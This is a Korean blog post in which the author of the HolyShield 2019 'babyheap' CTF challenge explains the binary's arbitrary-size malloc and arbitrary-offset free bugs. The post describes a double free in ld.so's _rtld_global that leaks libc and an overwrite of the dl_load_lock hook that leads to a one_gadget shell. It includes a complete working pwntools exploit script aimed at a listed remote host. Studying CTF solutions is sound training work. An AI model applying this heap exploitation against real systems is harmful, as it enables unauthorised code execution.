---
title: holyshield babyheap write up
categories: [2019, holyshield, new]
tags: [CTF, linux, heap, baby]
---

홀쉴 내가 만든 문제

# analyze

``` c++
	printf("size\n> ");
	scanf("%d", &size);

	buf = (char *)malloc(size);
	if ( buf < 0 || size < 4)
		exit(1);
	printf("> ");
	read(0, buf, 8);
```

malloc의 size를 조절할수 있고
``` c++
	printf("index\n> ");
	scanf("%d", &index);

	if (index < 0)
		exit(1);

	buf = buf + index;

	freeCheck();
	free(buf);
```

free할 공간을 마음대로 지정할수 있다.
하지만 malloc은 5번 , free는 2번 할 수 있다.

# solve

malloc을 크게 할당해서 라이브러리 밑에 할당한다음에
```
0x7f2578170fa0 <_rtld_global+3904>:	0x0000000000000090	0x0000000000000040
0x7f2578170fb0 <_rtld_global+3920>:	0x00007f2578165e40	0x0000000000000001
```
ld_libc안에 있는
_rtld_global+3920 을 두번 free해주면 double free 취약점이 터지며 할당하면 libc_leak도 가능하다.

tcache_fd에 값을 쓰면서 릭을 하기 때문에 leak없이 다음에 malloc이 어디로 튈지 정해야되는데
_dl_fini에서
__rtld_lock_unlock_recursive (GL(dl_load_lock)); 가 호출될때 global 변수에서 dl_load_lock 함수를 가져오는데 이부분을 덮으면 eip가 컨트롤이 가능하다. 저부분은 gdb로 <_rtld_global+3840> 이며 tache의 맨 뒷 한바이트만 바꾸면 덮을수 있다.
one_gadget으로 쉘을 얻을 수 있다.

# ex.py
```
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

if len(sys.argv) < 2:
    host = "localhost"
    port = 4000
else:
    host = "1.224.175.16"
    port = 9982

def menu(index):
    s.recvuntil("> ")
    s.sendline(str(index))

def noLinesend(data):
    s.recvuntil("> ")
    s.send(data)

def malloc(size, data, line = 1):
    menu(1)
    menu(size)
    if line == 1:
        menu(data)
    else:
        noLinesend(data)

def free(index):
    menu(2)
    menu(index)

def pwn():
    malloc(200000, "EEE")
    free(245664)
    malloc(200000, "AAA")
    free(200704+245664)
    malloc(56, "\x68", line = 0)
    libc_base = u64(s.recv(8)) - 0x619f68
    one_gadget = libc_base + 0x4f322
    log.info("libc_base         : " +str(hex(libc_base)))
    malloc(56, p64(one_gadget), line = 0)
    malloc(56, p64(one_gadget), line = 0)

if __name__ == "__main__":
    s = remote(host, port)
    pwn()
    s.interactive()
```

# 후기
이번에 시간이 부족해서 babyheap 한문제를 만들었지만 내년엔 childheap과 adultheap을 만들어서 와야겠다..
홀리 실드 끝까지 참여해주신 분들께 감사드리며 내년엔 더 좋은 문제로 찾아뵙겠습니다. :D
